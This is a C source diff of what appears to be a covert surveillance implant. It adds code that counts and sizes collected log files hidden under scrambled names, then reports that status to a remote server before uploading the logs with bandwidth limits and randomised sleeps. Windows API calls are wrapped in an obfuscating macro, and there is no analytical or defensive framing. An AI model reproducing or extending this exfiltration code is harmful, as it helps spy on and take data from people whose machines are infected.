@@ -1238,6 +1238,8 @@ BOOL LOG_SendOutputCmd(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
 	char DirSpec[DLLNAMELEN];  
 	char *scrambled_search;
 	HANDLE hFind = INVALID_HANDLE_VALUE;
+	UINT64 log_count = 0;
+	UINT64 log_size = 0;
 
 	scrambled_search = LOG_ScrambleName("OUTF*.log", crypt_key[0], TRUE);
 	if (!scrambled_search)
@@ -1245,6 +1247,21 @@ BOOL LOG_SendOutputCmd(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
 
 	HM_CompletePath(scrambled_search, DirSpec);
 	SAFE_FREE(scrambled_search);
+
+	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
+	if (hFind == INVALID_HANDLE_VALUE) 
+		return TRUE;
+	do {
+		if (FindFileData.nFileSizeLow>0) {
+			log_count++;
+			log_size+=FindFileData.nFileSizeLow;
+		}
+	} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
+	FNC(FindClose)(hFind);
+
+	if (log_count>0)
+		if (!ASP_SendStatus(log_count, log_size))
+			return FALSE;
 
 	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
 	if (hFind != INVALID_HANDLE_VALUE) {
@@ -1275,6 +1292,8 @@ BOOL LOG_SendLogQueue(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
 	log_list_struct *log_list;
 	HANDLE hFind = INVALID_HANDLE_VALUE;
 	DWORD tmp_free_space;
+	UINT64 log_count = 0;
+	UINT64 log_size = 0;
 
 	// Cerca tutti i file di tipo "1/0LOG*.log", sia LOG_, sia LOGF_
 	// Sono i nuovi tipi di log
@@ -1291,8 +1310,20 @@ BOOL LOG_SendLogQueue(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
 	if (hFind != INVALID_HANDLE_VALUE) {
 		do {
 			InsertLogList(&log_list_head, &FindFileData);
+			if (FindFileData.nFileSizeLow > 0) {
+				log_count++;
+				log_size += FindFileData.nFileSizeLow;
+			}
 		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
 		FNC(FindClose)(hFind);
+	}
+
+	if (log_count>0) {
+		if (!ASP_SendStatus(log_count, log_size)) {
+			FreeLogList(&log_list_head);
+			ASP_Bye();
+			return FALSE;
+		}
 	}
 
 	// Scorre la lista dei file di log ordinata per data
